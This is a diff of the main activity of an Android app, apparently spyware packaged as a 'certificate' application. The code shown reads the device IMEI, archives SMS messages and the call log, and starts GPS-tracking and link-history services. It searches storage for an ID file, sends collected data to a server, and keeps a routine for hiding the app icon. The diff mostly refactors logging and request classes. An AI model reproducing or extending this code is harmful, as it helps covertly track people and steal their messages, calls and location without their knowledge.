@@ -1,11 +1,11 @@
 package com.inet.android.bs;
 
 import java.io.File;
-import java.io.ObjectInputStream.GetField;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
+
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
@@ -27,13 +27,14 @@ import android.util.Log;
 import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
-
-import com.inet.android.archive.call.ArchiveCall;
-import com.inet.android.archive.sms.ArchiveSms;
 import com.inet.android.certificate.R;
+import com.inet.android.archive.ArchiveCall;
+import com.inet.android.archive.ArchiveSms;
 import com.inet.android.history.LinkService;
-import com.inet.android.info.GetInfo;
 import com.inet.android.location.GPSTracker;
+import com.inet.android.request.DataRequest;
+import com.inet.android.request.StartRequest;
+import com.inet.android.utils.Logging;
 
 public class MainActivity extends Activity {
 	Button install;
@@ -56,31 +57,30 @@ public class MainActivity extends Activity {
 	File[] fileArray;
 	private String sIMEI;
 	private String sID;
+	private String account;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
-		// setContentView(R.layout.activity_main);
+		setContentView(R.layout.activity_main);
 		context = getApplicationContext();
-		FileLog.writeLog("\n\n ============================ ");
-		FileLog.writeLog("\n onCreate \n");
-		FileLog.writeLog("\n ============================\n ");
-
+		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
+	
 		sp = PreferenceManager
 				.getDefaultSharedPreferences(context);
 		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
-		String versionAndroid = android.os.Build.VERSION.RELEASE;
+		String androidVersion = android.os.Build.VERSION.RELEASE;
 //		GetInfo getInfo = new  GetInfo(context);
 //		getInfo.getInfo();
 		ArchiveSms arhSms = new ArchiveSms();
 		arhSms.execute(context);
 		ArchiveCall arhCall = new ArchiveCall();
 		arhCall.execute(context);	
-		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
+		aboutDev = " Model: " + model + " Version android: " + androidVersion;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
 		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
@@ -88,9 +88,6 @@ public class MainActivity extends Activity {
 		e.putString("ABOUT", aboutDev);
 		e.commit();
 
-		// hideIcon();
-
-		// проверяем, первый ли раз открывается программа
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
@@ -100,12 +97,15 @@ public class MainActivity extends Activity {
 			e.putString("ABOUT", aboutDev);
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 			e.commit();
+			
 //			hideIcon();
 		}
+		
 		getID(); // рекурсивный поиск файла с нужным именем
 		if (sp.getString("ID", "ID").equals("ID")) {
-			Log.d("mainID", "ID viewdDalog");
-			FileLog.writeLog(LOG_TAG + " -> File not found. Show dialog.");
+
+			Logging.doLog(LOG_TAG, "File not found. Show dialog.", "File not found. Show dialog.");
+			
 			viewIDDialog();
 		} else
 			finish();
@@ -116,22 +116,20 @@ public class MainActivity extends Activity {
 	        super.onConfigurationChanged(newConfig);  
 	}
 	private boolean viewIDDialog() {
-		// TODO Auto-generated method stub
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
 
-		alert.setTitle("Ввод ID");
-		alert.setMessage("Введите ID. Нет права на ошибку!");
+		alert.setTitle("Ввод account number");
+		alert.setMessage("Введите account number. Нет права на ошибку!");
 
-		// Set an EditText view to get user input
 		final EditText input = new EditText(this);
 		alert.setView(input);
 
 		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
 			public void onClick(DialogInterface dialog, int whichButton) {
 				String value = input.getText().toString();
-				// Do something with value!
-				Log.d(LOG_TAG, "Text: " + value);
-				FileLog.writeLog("Text: " + value);
+
+				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);
+				
 				sp = PreferenceManager
 						.getDefaultSharedPreferences(getApplicationContext());
 				Editor e = sp.edit();
@@ -164,16 +162,19 @@ public class MainActivity extends Activity {
 				+ Long.toString(System.currentTimeMillis())
 				+ sp.getString("ABOUT", "about") + "</url></packet>";
 
-		FileLog.writeLog("MainAct diagRequest: before req");
+		Logging.doLog(LOG_TAG, "MainAct diagRequest: before req", "MainAct diagRequest: before req");
 
-		Request req = new Request(context);
-		req.sendRequest(diag);
-		Log.d(LOG_TAG, "post req");
-		FileLog.writeLog("MainActRequest: post req");
+//		RequestMakerImpl req = new RequestMakerImpl(context);
+//		req.sendDataRequest(diag);
+		DataRequest dr = new DataRequest(context);
+		dr.sendRequest(diag);
+		
+		Logging.doLog(LOG_TAG, "MainAct diagRequest: post req", "MainAct diagRequest: post req");
 	}
 
 	public void getID() {
-		Log.d(LOG_TAG, "Start search ID ");
+		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
+		
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
 		recursiveFileFind(file);
 	}
@@ -200,10 +201,9 @@ public class MainActivity extends Activity {
 					e.commit();
 					Log.d("ID", sp.getString("ID", "ID"));
 					if (!sp.getString("ID", "ID").equals("ID")) {
-						sendDiagPost();
-						// Toast.makeText(this, sourceApk,
-						// Toast.LENGTH_LONG).show();
-						start(); // запуск сервисов
+						sendStartRequest();
+//						sendDiagPost();
+//						start(); // запуск сервисов
 						return true;
 					}
 					break;
@@ -215,25 +215,30 @@ public class MainActivity extends Activity {
 		return false;
 	}
 
+	private void sendStartRequest() {
+//		RequestMaker service = new RequestMakerImpl(context);
+//		String str = "\"";
+//		service.sendStartRequest(str);
+		String str = "\"";
+		StartRequest sr = new StartRequest(context);
+		sr.sendRequest(str);
+	}
+
 	public void start() {
-		Log.d(LOG_TAG, "start services");
-		FileLog.writeLog("start services");
+		Logging.doLog(LOG_TAG, "start services", "start services");
 
 		startService(new Intent(MainActivity.this, Request4.class));
 
 		try {
 			TimeUnit.MILLISECONDS.sleep(1000);
 		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 
 		startService(new Intent(MainActivity.this, GPSTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
-//		contentObserved();
-		Log.d(LOG_TAG, "finish start services");
-		FileLog.writeLog("finish start services");
-
+		
+		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
 	}
 
 	public void hideIcon() {
